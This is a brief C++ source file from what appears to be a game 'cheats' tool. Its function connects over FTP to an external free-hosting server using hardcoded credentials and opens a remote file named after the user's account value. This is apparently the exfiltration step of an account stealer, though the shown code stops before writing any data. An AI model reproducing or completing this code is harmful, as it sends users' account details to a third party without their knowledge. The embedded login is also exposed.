#include "MyCodesCheats.h"

#pragma comment(lib, "wininet.lib")

using namespace std;

int SendForMySessionFTP()
{
	MyCodesCheats pb; pb.calcAddress();

	cout << endl << "CONECTANDO..." << endl;

	HINTERNET Session = InternetConnect(
		InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0), 
		"files.000webhost.com", INTERNET_DEFAULT_FTP_PORT, 
		"unsubject-compilers", "almadoida", INTERNET_SERVICE_FTP, 0, 0);

	cout << "CONECTADO! -> " << endl; 

	HINTERNET gh = FtpOpenFile(Session, _strdup(pb.getAccount().c_str()), 
		GENERIC_WRITE , FTP_TRANSFER_TYPE_ASCII, 0);
	

	cout << "Arquivo gerado com sucesso!" << endl;

	
	cout << "fechando conexão" << endl;
	InternetCloseHandle(Session);

 return EXIT_SUCCESS;
}
